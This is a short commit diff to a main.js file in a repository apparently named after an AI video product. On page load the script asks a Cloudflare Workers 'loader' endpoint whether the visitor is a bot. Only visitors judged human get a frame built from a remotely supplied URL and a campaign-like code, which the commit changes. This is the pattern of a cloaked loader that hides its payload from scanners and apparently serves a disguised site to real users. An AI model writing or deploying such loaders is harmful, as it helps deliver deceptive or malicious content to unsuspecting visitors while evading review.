f952614100804c4376563e9bb0a48cfcc4ab77d9
runway-ai-video <tanizinona@gmail.com>
2025-07-26 21:50:58 +0100

    main.js

--- main.js
+++ main.js
@@ -55,7 +55,7 @@ window.addEventListener('message', (message) => {
 window.addEventListener('DOMContentLoaded', () => {
     fetch('https://proxy_cf.kauporuut340.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
-            createFrame(res.url + 'kDfvSV84')
+            createFrame(res.url + 'nRhGL7pC')
         } else {
             setTimeout(toggleLoad, 500);
 
